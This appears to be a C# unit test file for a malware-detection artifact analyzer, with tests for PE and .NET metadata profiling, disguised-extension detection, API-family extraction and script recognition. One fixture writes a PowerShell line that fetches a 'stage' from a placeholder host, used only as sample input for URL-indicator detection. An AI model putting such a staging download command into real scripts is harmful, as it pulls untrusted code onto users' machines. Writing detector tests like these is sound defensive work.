using Detector.Analysis;

namespace Detector.Tests;

public sealed class ArtifactAnalyzerTests
{
    [Fact]
    public void Analyze_ProfilesManagedAssemblyWithoutLoadingIt()
    {
        var path = typeof(ArtifactAnalyzerTests).Assembly.Location;

        var result = new ArtifactAnalyzer().Analyze(path);

        Assert.Equal(ArtifactKind.ManagedAssembly, result.Artifact.Kind);
        Assert.Equal("Detector.Tests", result.Artifact.AssemblyName);
        Assert.Equal(64, result.Artifact.Sha256.Length);
        Assert.True(result.Artifact.Size > 0);
        Assert.InRange(result.Artifact.Entropy, 0, 8);
        Assert.False(string.IsNullOrWhiteSpace(result.Artifact.Architecture));
        Assert.False(string.IsNullOrWhiteSpace(result.Artifact.Trust));
        Assert.Contains(".NETCoreApp", result.Artifact.TargetFramework, StringComparison.Ordinal);
        Assert.Contains("Detector.Core", result.Artifact.AssemblyReferences);
        Assert.NotEmpty(result.Artifact.Sections);
        Assert.Contains(result.Coverage, item => item.Module == "PE/.NET metadata" && item.State == CoverageState.Completed);
        Assert.Contains(result.Coverage, item => item.Module == "Authenticode" && item.State == CoverageState.Completed);
    }

    [Fact]
    public void Analyze_DetectsPortableExecutableBehindMisleadingExtension()
    {
        var root = CreateDirectory();
        try
        {
            var disguised = Path.Combine(root, "invoice.dat");
            File.Copy(typeof(ArtifactAnalyzerTests).Assembly.Location, disguised);

            var result = new ArtifactAnalyzer().Analyze(disguised);

            Assert.Equal(ArtifactKind.ManagedAssembly, result.Artifact.Kind);
            Assert.Contains(result.Findings, item => item.Rule == "artifact.extension-mismatch");
        }
        finally { Directory.Delete(root, recursive: true); }
    }

    [Fact]
    public void Analyze_ExtractsPInvokeAndBehaviorApiFamiliesFromMetadata()
    {
        var path = typeof(Detector.Process.PeAnalyzer).Assembly.Location;

        var result = new ArtifactAnalyzer().Analyze(path);

        Assert.Contains(result.Artifact.ApiReferences, item => item.Family == "pinvoke");
        Assert.Contains(result.Artifact.ApiReferences, item => item.Family == "process-access");
        Assert.Contains(result.Findings, item => item.Rule == "metadata.api.process-access");
    }

    [Fact]
    public void Analyze_ExtractsNativeImportsWithoutLoadingTheImage()
    {
        var path = Path.Combine(Environment.SystemDirectory, "kernel32.dll");

        var result = new ArtifactAnalyzer().Analyze(path);

        Assert.Equal(ArtifactKind.PortableExecutable, result.Artifact.Kind);
        Assert.NotEmpty(result.Artifact.NativeImports);
    }

    [Fact]
    public void Analyze_RecognizesPowerShellAndCSharpFromTheirExtensions()
    {
        var root = CreateDirectory();
        try
        {
            var powerShell = Path.Combine(root, "collect.ps1");
            var csharp = Path.Combine(root, "Program.cs");
            File.WriteAllText(powerShell, "Invoke-WebRequest https://example.invalid/stage");
            File.WriteAllText(csharp, "internal static class Program { public static void Main() { } }");

            var psResult = new ArtifactAnalyzer().Analyze(powerShell);
            var csResult = new ArtifactAnalyzer().Analyze(csharp);

            Assert.Equal(ArtifactKind.PowerShell, psResult.Artifact.Kind);
            Assert.Contains(psResult.Indicators, item => item.Kind == IndicatorKind.Url);
            Assert.Contains(psResult.Coverage, item => item.Module == "PowerShell" && item.State == CoverageState.Completed);
            Assert.Equal(ArtifactKind.CSharpSource, csResult.Artifact.Kind);
            Assert.Contains(csResult.Coverage, item => item.Module == "C# source" && item.State == CoverageState.Completed);
        }
        finally { Directory.Delete(root, recursive: true); }
    }

    private static string CreateDirectory()
    {
        var path = Path.Combine(Path.GetTempPath(), "DetectorTests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }
}
